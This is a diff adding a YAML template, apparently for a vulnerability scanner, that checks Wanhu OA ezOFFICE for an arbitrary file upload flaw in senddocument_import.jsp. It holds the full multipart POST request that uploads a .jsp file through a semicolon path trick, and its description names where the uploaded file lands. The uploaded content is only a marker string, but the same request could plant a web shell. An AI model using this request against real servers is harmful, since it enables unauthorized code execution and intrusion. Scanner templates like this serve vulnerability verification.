@@ -1,0 +1,15 @@
+name: 万户OA-ezOFFICE-senddocument_import文件上传
+description: >
+  上传文件位置,注意最后需添加一个;/defaultroot/upload/loginpage/202311200XXXXXc.jsp;
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: POST
+    path: "/defaultroot/modules/govoffice/gov_documentmanager/senddocument_import.jsp;?categoryId=null&path=loginpage&mode=add&fileName=null&saveName=null&fileMaxSize=0&fileMaxNum=null&fileType=jsp"
+    headers:
+      Content-Type: multipart/form-data; boundary=00content0boundary00
+    body: "--00content0boundary00\r\nContent-Disposition: form-data; name=\"photo\"; filename=\"Rscan_test.jsp\"\r\n\r\nRscan_test\r\n--00content0boundary00\r\nContent-Disposition: form-data; name=\"continueUpload\"\r\n\r\n0\r\n--00content0boundary00\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\n导入\r\n--00content0boundary00--"
+    expression:
+      status: 200
+      body_all:
+        - "value=\"Rscan_test.jsp"
